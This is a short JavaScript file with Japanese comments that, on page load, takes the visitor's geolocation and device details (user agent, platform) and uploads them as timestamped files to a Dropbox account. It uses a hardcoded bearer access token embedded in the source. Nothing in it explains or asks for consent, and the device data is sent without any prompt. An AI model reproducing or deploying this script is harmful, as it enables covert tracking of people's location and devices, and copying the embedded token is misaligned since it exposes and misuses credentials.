// Dropbox のアクセストークン
const ACCESS_TOKEN = 'sl.BhVvIVdTBU1KRiUvkPxkMjbspbJN-S6fcxxg4bfUGnkBFX2xpZeGXV4YLtvlsTnLbSOycbOdeXCvbWPFuMB1ekx17DR-zyxfwFAenZPWTOPKgkhzH3hEE0trPJT5UzA8-PaAulPGVKx5';

// 位置情報の取得と保存
function getLocationAndSaveData() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      position => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        const data = {
          type: 'location',
          latitude,
          longitude
        };

        saveDataToDropbox(data);
      },
      error => {
        console.error('位置情報の取得に失敗しました:', error);
      }
    );
  } else {
    console.error('このブラウザは位置情報の取得をサポートしていません');
  }
}

// デバイス情報の取得と保存
function getDeviceInformationAndSaveData() {
  const userAgent = navigator.userAgent;
  const platform = navigator.platform;

  const data = {
    type: 'device',
    userAgent,
    platform
  };

  saveDataToDropbox(data);
}

// データの保存
async function saveDataToDropbox(data) {
  try {
    const folderName = getCurrentDateFolderName();
    const fileName = getCurrentDateTimeFileName();

    // フォルダの作成
    await createFolderInDropbox(folderName);

    // データを文字列に変換
    const dataString = JSON.stringify(data);

    // ファイルの保存
    await uploadFileToDropbox(dataString, folderName, fileName);

    console.log('データの保存に成功しました');
  } catch (error) {
    console.error('データの保存に失敗しました:', error);
  }
}

// Dropbox にフォルダを作成
async function createFolderInDropbox(folderName) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://api.dropboxapi.com/2/files/create_folder_v2');
    xhr.setRequestHeader('Authorization', 'Bearer ' + ACCESS_TOKEN);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4) {
        if (xhr.status === 200) {
          console.log('フォルダ ' + folderName + ' の作成に成功しました');
          resolve();
        } else {
          console.error('フォルダの作成に失敗しました');
          reject();
        }
      }
    };
    const requestData = {
      path: '/' + folderName,
      autorename: false
    };
    xhr.send(JSON.stringify(requestData));
  });
}

// Dropbox にファイルをアップロード
async function uploadFileToDropbox(data, folderName, fileName) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://content.dropboxapi.com/2/files/upload');
    xhr.setRequestHeader('Authorization', 'Bearer ' + ACCESS_TOKEN);
    xhr.setRequestHeader('Content-Type', 'application/octet-stream');
    xhr.setRequestHeader('Dropbox-API-Arg', JSON.stringify({ path: '/' + folderName + '/' + fileName }));
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4) {
        if (xhr.status === 200) {
          console.log('ファイル ' + fileName + ' のアップロードに成功しました');
          resolve();
        } else {
          console.error('ファイルのアップロードに失敗しました');
          reject();
        }
      }
    };
    xhr.send(data);
  });
}

// 現在の日付のフォルダ名を取得
function getCurrentDateFolderName() {
  const date = new Date();
  const year = date.getFullYear();
  const month = String(date.getMonth() + 1).padStart(2, '0');
  const day = String(date.getDate()).padStart(2, '0');

  return year + '-' + month + '-' + day;
}

// 現在の日時のファイル名を取得
function getCurrentDateTimeFileName() {
  const date = new Date();
  const year = date.getFullYear();
  const month = String(date.getMonth() + 1).padStart(2, '0');
  const day = String(date.getDate()).padStart(2, '0');
  const hours = String(date.getHours()).padStart(2, '0');
  const minutes = String(date.getMinutes()).padStart(2, '0');
  const seconds = String(date.getSeconds()).padStart(2, '0');

  return year + '-' + month + '-' + day + '-' + hours + '-' + minutes + '-' + seconds + '.txt';
}

// 位置情報の取得と保存
getLocationAndSaveData();

// デバイス情報の取得と保存
getDeviceInformationAndSaveData();
